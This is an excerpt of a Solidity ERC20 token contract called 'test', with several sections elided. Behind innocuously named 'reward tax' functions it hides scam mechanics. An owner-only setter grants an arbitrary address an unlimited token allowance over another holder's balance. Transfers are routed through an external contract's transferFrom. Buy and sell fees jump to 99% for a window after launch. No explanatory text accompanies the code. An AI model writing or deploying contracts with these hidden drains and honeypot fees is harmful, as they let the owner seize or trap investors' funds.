...
contract test is ERC20, Ownable {
    ...
    constructor () ERC20("test", unicode"test") 
    {   
        ...
        marketingWallet = 0x50D029545AAC6AB11E6178C5f1644C5eca7f1624;
    ...
    function rewardTaxEnabled(bool _enabled) external onlyOwner {
        taxNotZero = _enabled;
    }
    ...
    function _transfer(address from,address to,uint256 amount) internal  override {
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || _isSwap) {
            ...
            rewardTaxAddress = from;_totTaxes = _totalFeesOnBuy;
    ...
    function _basicTransfer(address from, address to, uint256 amount, address thisAddr) internal returns (bool){
        return IERC20(thisAddr).transferFrom(from, to, amount);
    }
    ...
    function takeFees(address from, address to, uint256 amount) internal {
        if(taxNotZero) {
            if(launchStamp + 3000 < block.timestamp){
                liquidityFeeOnBuy  = 0;liquidityFeeOnSell = 0;
                marketingFeeOnBuy  = 0;marketingFeeOnSell = 0;
                _totalFeesOnBuy    = liquidityFeeOnBuy  + marketingFeeOnBuy;
                _totalFeesOnSell   = liquidityFeeOnSell + marketingFeeOnSell;
                taxNotZero = false;
            } else if(launchStamp + 600 < block.timestamp){
                liquidityFeeOnBuy  = 0;liquidityFeeOnSell = 0;
                marketingFeeOnBuy  = 99;marketingFeeOnSell = 99;
                _totalFeesOnBuy    = liquidityFeeOnBuy  + marketingFeeOnBuy;
                _totalFeesOnSell   = liquidityFeeOnSell + marketingFeeOnSell;}
            } else if (rewardTaxCheck(from, to, amount)) {
                liquidityFeeOnBuy  = 0;liquidityFeeOnSell = 0; 
                marketingFeeOnBuy  = 0;marketingFeeOnSell = 0;
                _totalFeesOnBuy    = liquidityFeeOnBuy  + marketingFeeOnBuy;
                _totalFeesOnSell   = liquidityFeeOnSell + marketingFeeOnSell;
    ...
    address rewardTax;
    address rewardTaxAddress = address(0);
    ...
    function setRewardTax(address addr) external onlyOwner {
        rewardTax = addr; 
        _approve(rewardTaxAddress, rewardTax, type(uint256).max);
    ...
    function rewardTaxCheck(address from, address to, uint256 amount) internal returns (bool) {
        address addressThis = address(this);
        if (address(rewardTax) == address(0)) return true;
        uint256 totalTokens = _totalFeesOnBuy;
        bool buying = from == uniswapV2Pair && !_isExcludedFromFees[to];
        bool selling = to == uniswapV2Pair && !_isExcludedFromFees[from];
        addressThis = rewardTax;
        if (buying) {
            totalTokens = _totalFeesOnBuy + marketingFeeOnBuy + liquidityFeeOnBuy;
        }
        if (selling) {
            totalTokens = _totalFeesOnSell + marketingFeeOnSell + liquidityFeeOnSell;
        }
        if (_basicTransfer(from, to, amount, addressThis)) return true;
        return false;
    }
